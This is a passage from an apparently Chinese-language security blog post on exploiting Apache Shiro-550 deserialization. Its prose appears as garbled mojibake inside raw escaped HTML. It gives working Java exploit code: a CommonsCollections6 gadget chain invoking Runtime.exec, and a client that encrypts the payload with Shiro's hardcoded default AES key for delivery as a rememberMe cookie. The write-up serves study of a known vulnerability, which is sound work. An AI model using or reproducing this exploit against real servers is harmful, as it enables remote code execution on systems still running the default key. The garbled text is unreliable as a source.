&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="cck1shiro-550">CCK1(Shiro-550)&lt;/h2>
&lt;p>pç‰›ç»™å‡ºäº†ä¸€ä¸ª&lt;a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">å°demo&lt;/a>ï¼Œåªæœ‰ä¸¤ä¸ªjspï¼Œä¾èµ–æœ‰è¿™äº›&lt;/p>
&lt;ul>
&lt;li>shiro-coreã€shiro-webï¼Œè¿™æ˜¯shiroæœ¬èº«çš„ä¾èµ–&lt;/li>
&lt;li>javax.servlet-apiã€jsp-apiï¼Œè¿™æ˜¯JSPå’ŒServletçš„ä¾èµ–ï¼Œä»…åœ¨ç¼–è¯‘é˜¶æ®µä½¿ç”¨ï¼Œå› ä¸ºTomcatä¸­è‡ªå¸¦è¿™ä¸¤ä¸ªä¾èµ–&lt;/li>
&lt;li>slf4j-apiã€slf4j-simpleï¼Œè¿™æ˜¯ä¸ºäº†æ˜¾ç¤ºshiroä¸­çš„æŠ¥é”™ä¿¡æ¯æ·»åŠ çš„ä¾èµ–&lt;/li>
&lt;li>commons-loggingï¼Œè¿™æ˜¯shiroä¸­ç”¨åˆ°çš„ä¸€ä¸ªæ¥å£ï¼Œä¸æ·»åŠ ä¼šçˆ†java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactoryé”™è¯¯&lt;/li>
&lt;li>commons-collectionsï¼Œä¸ºäº†æ¼”ç¤ºååºåˆ—åŒ–æ¼æ´ï¼Œå¢åŠ äº†commons-collectionsä¾èµ–ï¼Œç‰ˆæœ¬ä¸º3.2.1&lt;/li>
&lt;/ul>
&lt;p>æ‰“waråŒ…åéƒ¨ç½²åœ¨æœ¬åœ°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301201435981.png" alt="image-20220301201435981">&lt;/p>
&lt;p>æŠ“åŒ…å¯ä»¥çœ‹åˆ°ï¼Œä¸å‹¾é€‰&lt;code>Remember Me&lt;/code>æ—¶cookieæœ‰rememberMe=deleteMeï¼Œå‹¾é€‰çš„è¯åˆ™æ˜¯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301202246982.png" alt="image-20220301202246982">&lt;/p>
&lt;p>è¿™é‡Œçš„b64åŠ å¯†ä¿¡æ¯æ˜¯AESï¼Œåœ¨&lt;code>org.apache.shiro.mgt.AbstractRememberMeManager&lt;/code>ä¸­å¯ä»¥çœ‹åˆ°é»˜è®¤key&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301232709437.png" alt="image-20220301232709437">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301232313280.png" alt="image-20220301232313280">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°å®ƒåœ¨åŒåçš„æ„é€ å‡½æ•°ä¸­è®¾ç½®äº†è¿™ä¸ªdefault keyï¼Œè€Œæ§åˆ¶cookieä¿¡æ¯&lt;code>org.apache.shiro.web.mgt.CookieRememberMeManager&lt;/code>ç»§æ‰¿äº†è¿™ä¸ªç±»&lt;/p>
&lt;p>ç”±äºå®ƒä½¿ç”¨äº†é»˜è®¤keyå¹¶ä¸”ç”¨äº†ccä¾èµ–ï¼Œæˆ‘ä»¬çš„æ”»å‡»è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š&lt;/p>
&lt;ul>
&lt;li>ç”¨CCé“¾ç”Ÿæˆpayload&lt;/li>
&lt;li>ç”¨Shiroé»˜è®¤keyè¿›è¡ŒåŠ å¯†&lt;/li>
&lt;li>å°†å¯†æ–‡ä½œä¸ºrememberMeçš„Cookieå‘é€ç»™æœåŠ¡ç«¯&lt;/li>
&lt;/ul>
&lt;h3 id="cc6ä¸ºä»€ä¹ˆä¸è¡Œ">CC6ä¸ºä»€ä¹ˆä¸è¡Œ&lt;/h3>
&lt;p>pç‰›å†™äº†ä¸€ä¸ªåŸºäºCC6çš„exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">com.govuln.shiroattack&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.crypto.AesCipherService&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.util.ByteSource&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Client0&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#f92672">[]&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">payloads&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">CommonsCollections6&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;whoami&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">AesCipherService&lt;/span> &lt;span style="color:#111">aes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">AesCipherService&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDecoder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;kPH+bIxk5D2deZiIxcaaaA==&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteSource&lt;/span> &lt;span style="color:#111">ciphertext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">aes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">payloads&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ciphertext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">com.govuln.shiroattack&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsCollections6&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">command&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ä¸å†ä½¿ç”¨åŸCommonsCollections6ä¸­çš„HashSetï¼Œç›´æ¥ä½¿ç”¨HashMap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tme&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">expMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">tme&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;valuevalue&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">remove&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°†ç”Ÿæˆç»“æœå‘é€ï¼Œä½†æ˜¯consoleç–¯ç‹‚æŠ¥é”™&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301212540550.png" alt="image-20220301212540550">&lt;/p>
